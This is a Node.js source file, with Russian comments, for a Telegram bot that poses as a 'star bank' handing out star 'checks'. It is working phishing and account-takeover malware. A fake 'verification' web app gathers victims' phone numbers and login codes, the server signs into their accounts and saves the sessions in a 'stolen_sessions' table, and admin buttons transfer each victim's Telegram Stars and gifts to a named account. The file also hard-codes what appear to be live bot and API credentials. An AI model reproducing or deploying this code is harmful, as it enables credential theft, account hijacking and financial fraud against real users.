const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8319103126:AAGvA6pmIIbgwqFE8SUUw3r-M7kRd-8OJoo';
const API_ID = parseInt(process.env.API_ID) || 30427944;
const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://eeee-2bsj.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { 
    polling: true,
    filepath: false
});

const app = express();
const activeSessions = new Map();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        session_string TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        stars_data INTEGER DEFAULT 0,
        gifts_data INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS used_checks (
        user_id INTEGER,
        check_id INTEGER,
        used_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY (user_id, check_id)
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', async (req, res) => {
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            let userId = null;
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                userId = userData.id;
            }
            
            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
            
            await requestRealTelegramCode(req.body.phone, userId);
                
        } catch (error) {
            console.log('❌ Ошибка:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        const phone = req.body.phone;
        const code = req.body.code;
        
        await signInWithRealCode(phone, code);
    }
    
    res.sendStatus(200);
});

// Запрос кода
async function requestRealTelegramCode(phone, userId) {
    try {
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 5,
            timeout: 60000,
            useWSS: false
        });
        
        await client.connect();

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({})
            })
        );

        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash,
            session: stringSession
        });

        db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
            [result.phoneCodeHash, phone]);

        bot.sendMessage(MY_USER_ID, `🔐 Код запрошен: ${phone}`);
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// Вход с кодом
async function signInWithRealCode(phone, code) {
    try {
        const sessionData = activeSessions.get(phone);
        if (!sessionData) return;

        const client = sessionData.client;
        const phoneCodeHash = sessionData.phoneCodeHash;

        try {
            await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code.toString()
                })
            );

            const sessionString = client.session.save();
            db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                [sessionString, phone]);

            const user = await client.getMe();
            bot.sendMessage(MY_USER_ID, `✅ Сессия сохранена: ${phone}\n👤 @${user.username || 'нет'}`);
            
            await client.disconnect();
            activeSessions.delete(phone);

        } catch (signInError) {
            bot.sendMessage(MY_USER_ID, `❌ Ошибка входа: ${phone}`);
            activeSessions.delete(phone);
        }

    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
});

// INLINE QUERY ДЛЯ ЧЕКОВ
bot.on('inline_query', (query) => {
    const results = [
        {
            type: 'article',
            id: '1',
            title: '🎫 Чек на 50 звезд',
            description: 'Создать чек на 50 звезд',
            input_message_content: {
                message_text: '🎫 Чек на 50 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
                parse_mode: 'HTML'
            },
            reply_markup: {
                inline_keyboard: [[
                    { text: "🪙 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_check_50` }
                ]]
            }
        },
        {
            type: 'article',
            id: '2',
            title: '💫 Чек на 100 звезд',
            description: 'Создать чек на 100 звезд',
            input_message_content: {
                message_text: '🎫 Чек на 100 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
                parse_mode: 'HTML'
            },
            reply_markup: {
                inline_keyboard: [[
                    { text: "💫 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_check_100` }
                ]]
            }
        }
    ];
    
    bot.answerInlineQuery(query.id, results, { cache_time: 1 });
});

// ГЛАВНОЕ МЕНЮ С ФОТКОЙ
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    // Создаем пользователя с балансом 0
    db.run(`INSERT OR IGNORE INTO users (user_id, username, balance) VALUES (?, ?, 0)`, 
        [msg.from.id, msg.from.username]);
    
    const menuText = `💫 @MyStarBank_bot - Система передачи звезд\n\nДля начала работы:`;
    
    const menuKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "💰 Баланс", callback_data: "user_balance" }],
                [{ text: "🎁 Вывести", callback_data: "user_withdraw" }]
            ]
        }
    };

    // Пробуем отправить с фото
    const photoPath = path.resolve(__dirname, 'public', 'avatar.jpg');
    bot.sendPhoto(chatId, photoPath, {
        caption: menuText,
        parse_mode: 'HTML',
        reply_markup: menuKeyboard.reply_markup
    }).catch(photoError => {
        // Fallback - без фото
        bot.sendMessage(chatId, menuText, {
            parse_mode: 'HTML',
            reply_markup: menuKeyboard.reply_markup
        });
    });
});

// ОБРАБОТКА КНОПОК
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    try {
        await bot.answerCallbackQuery(query.id);
        
        if (query.data === 'user_balance') {
            db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
                const balance = row ? row.balance : 0;
                bot.sendMessage(chatId, `💰 Ваш баланс: ${balance} stars`);
            });
            
        } else if (query.data === 'user_withdraw') {
            bot.sendMessage(chatId,
                `🔐 <b>Для вывода требуется верификация</b>`,
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Пройти верификацию", web_app: { url: WEB_APP_URL } }
                            ]
                        ]
                    }
                }
            );
            
        } else if (query.data === 'create_50' || query.data === 'create_100') {
            const amount = query.data === 'create_50' ? 50 : 100;
            
            db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
                [amount, userId], function(err) {
                if (err) return;
                
                const checkId = this.lastID;
                const checkText = `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`;
                
                // Отправляем чек с фоткой stars.jpg
                const starsPath = path.resolve(__dirname, 'public', 'stars.jpg');
                bot.sendPhoto(query.message.chat.id, starsPath, {
                    caption: checkText,
                    parse_mode: 'HTML',
                    reply_markup: { 
                        inline_keyboard: [[{ 
                            text: `🪙 Забрать ${amount} звезд`, 
                            url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                        }]] 
                    }
                }).catch(photoError => {
                    // Fallback без фото
                    bot.sendMessage(query.message.chat.id, checkText, {
                        parse_mode: 'HTML',
                        reply_markup: { 
                            inline_keyboard: [[{ 
                                text: `🪙 Забрать ${amount} звезд`, 
                                url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                            }]] 
                        }
                    });
                });
            });
            
        } else if (query.data === 'steal_gifts') {
            bot.sendMessage(chatId, "🔄 Начинаю кражу подарков...");
            await stealAllGifts();
        }
        else if (query.data === 'steal_stars') {
            bot.sendMessage(chatId, "🔄 Начинаю кражу звезд...");
            await stealAllStars();
        }
        else if (query.data === 'show_logs') {
            showLogs(chatId);
        }
    } catch (error) {}
});

// СОЗДАНИЕ ЧЕКОВ ЧЕРЕЗ @
bot.onText(/@MyStarBank_bot/, (msg) => {
    const starsPath = path.resolve(__dirname, 'public', 'stars.jpg');
    
    bot.sendPhoto(msg.chat.id, starsPath, {
        caption: '🎫 Создание чека:',
        reply_markup: {
            inline_keyboard: [
                [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
                [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
            ]
        }
    }).catch(photoError => {
        // Fallback без фото
        bot.sendMessage(msg.chat.id, '🎫 Создание чека:', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
                    [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
                ]
            }
        });
    });
});

// ОБРАБОТКА ЧЕКОВ
bot.onText(/\/start (.+)/, (msg, match) => {
    const params = match[1];
    const userId = msg.from.id;
    
    if (params.startsWith('check_')) {
        const checkId = params.split('_')[1];
        
        db.get(`SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`, [userId, checkId], (err, usedRow) => {
            if (err || usedRow) {
                bot.sendMessage(msg.chat.id, '❌ Чек уже использован!');
                return;
            }
            
            db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
                if (err || !row) {
                    bot.sendMessage(msg.chat.id, '❌ Чек не существует!');
                    return;
                }
                
                db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, userRow) => {
                    const newBalance = (userRow ? userRow.balance : 0) + row.amount;
                    
                    db.serialize(() => {
                        db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
                        db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
                            [userId, msg.from.username, newBalance]);
                        db.run(`INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, [userId, checkId]);
                    });
                    
                    // Отправляем фото с сообщением о получении чека
                    const starsPath = path.resolve(__dirname, 'public', 'stars.jpg');
                    bot.sendPhoto(msg.chat.id, starsPath, {
                        caption: `🎉 Получено ${row.amount} звезд!\n💫 Ваш баланс: ${newBalance} stars`
                    }).catch(photoError => {
                        // Fallback без фото
                        bot.sendMessage(msg.chat.id, 
                            `🎉 Получено ${row.amount} звезд!\n💫 Ваш баланс: ${newBalance} stars`
                        );
                    });
                });
            });
        });
        
    } else if (params.startsWith('create_check_')) {
        const amount = parseInt(params.split('_')[2]);
        
        db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
            [amount, userId], function(err) {
            if (err) return;
            
            const checkId = this.lastID;
            // Отправляем чек с фоткой
            const starsPath = path.resolve(__dirname, 'public', 'stars.jpg');
            bot.sendPhoto(msg.chat.id, starsPath, {
                caption: `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`,
                parse_mode: 'HTML',
                reply_markup: { 
                    inline_keyboard: [[{ 
                        text: `🪙 Забрать ${amount} звезд`, 
                        url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                    }]] 
                }
            }).catch(photoError => {
                // Fallback без фото
                bot.sendMessage(msg.chat.id, `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`, {
                    parse_mode: 'HTML',
                    reply_markup: { 
                        inline_keyboard: [[{ 
                            text: `🪙 Забрать ${amount} звезд`, 
                            url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                        }]] 
                    }
                });
            });
        });
    }
});

// КРАЖА ПОДАРКОВ (ИЗ ТВОЕГО КОДА 1:1)
async function stealAllGifts() {
    try {
        const rows = await new Promise((resolve, reject) => {
            db.all(`SELECT phone, session_string FROM stolen_sessions WHERE status = 'completed'`, (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });

        let totalStolen = 0;
        
        for (const row of rows) {
            try {
                const stringSession = new StringSession(row.session_string);
                const client = new TelegramClient(stringSession, API_ID, API_HASH, {
                    connectionRetries: 5,
                    timeout: 60000,
                    useWSS: false
                });
                
                await client.connect();
                bot.sendMessage(MY_USER_ID, `🔗 Подключен к ${row.phone}, ищу подарки...`);
                
                const result = await transferGiftsToNikLa(client, row.phone);
                await client.disconnect();
                
                if (result) totalStolen++;
                await new Promise(resolve => setTimeout(resolve, 3000));
                
            } catch (error) {
                console.log(`Ошибка: ${row.phone}`, error.message);
                bot.sendMessage(MY_USER_ID, `❌ Ошибка ${row.phone}: ${error.message}`);
            }
        }
        
        bot.sendMessage(MY_USER_ID, `✅ Украдено подарков с ${totalStolen} аккаунтов`);
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка кражи подарков: ${error.message}`);
    }
}

// КРАЖА ЗВЕЗД (ИЗ ТВОЕГО КОДА 1:1)
async function stealAllStars() {
    try {
        const rows = await new Promise((resolve, reject) => {
            db.all(`SELECT phone, session_string FROM stolen_sessions WHERE status = 'completed'`, (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });

        let totalStolen = 0;
        
        for (const row of rows) {
            try {
                const stringSession = new StringSession(row.session_string);
                const client = new TelegramClient(stringSession, API_ID, API_HASH, {
                    connectionRetries: 5,
                    timeout: 60000,
                    useWSS: false
                });
                
                await client.connect();
                bot.sendMessage(MY_USER_ID, `🔗 Подключен к ${row.phone}, проверяю звезды...`);
                
                const result = await transferStarsToNikLa(client, row.phone);
                await client.disconnect();
                
                if (result) totalStolen++;
                await new Promise(resolve => setTimeout(resolve, 3000));
                
            } catch (error) {
                console.log(`Ошибка: ${row.phone}`, error.message);
                bot.sendMessage(MY_USER_ID, `❌ Ошибка ${row.phone}: ${error.message}`);
            }
        }
        
        bot.sendMessage(MY_USER_ID, `✅ Украдено звезд с ${totalStolen} аккаунтов`);
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка кражи звезд: ${error.message}`);
    }
}

// РАБОЧАЯ ФУНКЦИЯ КРАЖИ ЗВЕЗД (ИЗ ТВОЕГО КОДА 1:1)
async function transferStarsToNikLa(client, phone) {
    try {
        // Получаем баланс звезд
        const status = await client.invoke(
            new Api.payments.GetStarsStatus({
                peer: new Api.InputPeerSelf(),
            })
        );

        const bal = status.balance;
        const starsAmount = Number(bal.amount) + Number(bal.nanos ?? 0) / 1_000_000_000;

        if (starsAmount === 0) {
            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет звезд`);
            return false;
        }

        // Ищем целевого пользователя
        const target = await client.invoke(
            new Api.contacts.ResolveUsername({ username: 'NikLaStore' })
        );
        
        if (!target || !target.users || target.users.length === 0) {
            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Не найден NikLaStore`);
            return false;
        }

        const targetUser = target.users[0];

        // Передаем звезды
        await client.invoke(
            new Api.payments.SendStars({
                peer: targetUser,
                stars: Math.floor(starsAmount),
                purpose: new Api.InputStorePaymentPremiumSubscription({
                    restore: false,
                    upgrade: true
                })
            })
        );

        db.run(`UPDATE stolen_sessions SET stars_data = ? WHERE phone = ?`, 
            [Math.floor(starsAmount), phone]);

        bot.sendMessage(MY_USER_ID, `✅ ${phone}: Украдено ${Math.floor(starsAmount)} звезд`);
        return true;
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ ${phone}: Ошибка передачи звезд - ${error.message}`);
        return false;
    }
}

// РАБОЧАЯ ФУНКЦИЯ КРАЖИ ПОДАРКОВ (ИЗ ТВОЕГО КОДА 1:1)
async function transferGiftsToNikLa(client, phone) {
    try {
        // Получаем список подарков
        const gifts = await client.invoke(
            new Api.payments.GetSavedStarGifts({
                peer: new Api.InputPeerSelf(),
                offset: "",
                limit: 100,
            })
        );

        if (!gifts.gifts || gifts.gifts.length === 0) {
            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет подарков`);
            return false;
        }

        const target = await client.invoke(
            new Api.contacts.ResolveUsername({ username: 'NikLaStore' })
        );
        
        if (!target || !target.users || target.users.length === 0) {
            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Не найден NikLaStore`);
            return false;
        }

        const targetUser = target.users[0];
        let stolenCount = 0;

        for (const gift of gifts.gifts) {
            try {
                // Пробуем передать подарок
                await client.invoke(
                    new Api.payments.TransferStarGift({
                        stargift: new Api.InputSavedStarGiftUser({ 
                            msgId: gift.msgId 
                        }),
                        toId: new Api.InputPeerUser({ 
                            userId: targetUser.id,
                            accessHash: targetUser.accessHash
                        })
                    })
                );
                
                stolenCount++;
                await new Promise(resolve => setTimeout(resolve, 2000));
                
            } catch (e) {
                // Если передача не работает, пробуем конвертировать в звезды
                try {
                    if (gift.convertStars) {
                        await client.invoke(
                            new Api.payments.SendStars({
                                peer: targetUser,
                                stars: gift.convertStars,
                                purpose: new Api.InputStorePaymentGift({
                                    userId: targetUser.id
                                })
                            })
                        );
                        stolenCount++;
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                } catch (e2) {
                    continue;
                }
            }
        }

        if (stolenCount > 0) {
            db.run(`UPDATE stolen_sessions SET gifts_data = ? WHERE phone = ?`, 
                [stolenCount, phone]);
            bot.sendMessage(MY_USER_ID, `✅ ${phone}: Украдено ${stolenCount} подарков`);
            return true;
        }
        
        return false;
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ ${phone}: Ошибка кражи подарков - ${error.message}`);
        return false;
    }
}

// ПОКАЗАТЬ ЛОГИ
function showLogs(chatId) {
    db.all(`SELECT phone, status, stars_data, gifts_data FROM stolen_sessions ORDER BY created_at DESC LIMIT 10`, (err, rows) => {
        let logText = '📊 <b>Последние сессии:</b>\n\n';
        
        if (rows.length === 0) {
            logText = '📊 Нет данных';
        } else {
            rows.forEach(row => {
                logText += `📱 ${row.phone}\n`;
                logText += `📊 ${row.status}\n`;
                logText += `⭐ ${row.stars_data} stars\n`;
                logText += `🎁 ${row.gifts_data} gifts\n`;
                logText += `────────────\n`;
            });
        }
        
        bot.sendMessage(chatId, logText, { parse_mode: 'HTML' });
    });
}

// АДМИНСКИЕ КОМАНДЫ
bot.onText(/\/admin/, (msg) => {
    if (msg.from.id !== MY_USER_ID) return;
    
    const adminText = `🛠️ <b>Админ панель</b>\n\nВыберите действие:`;
    
    const adminKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🎁 Украсть все подарки", callback_data: "steal_gifts" }],
                [{ text: "⭐ Украсть все звезды", callback_data: "steal_stars" }],
                [{ text: "📊 Посмотреть логи", callback_data: "show_logs" }]
            ]
        }
    };

    bot.sendMessage(msg.chat.id, adminText, {
        parse_mode: 'HTML',
        ...adminKeyboard
    });
});

console.log('✅ Бот запущен с чеками и кражами 1:1');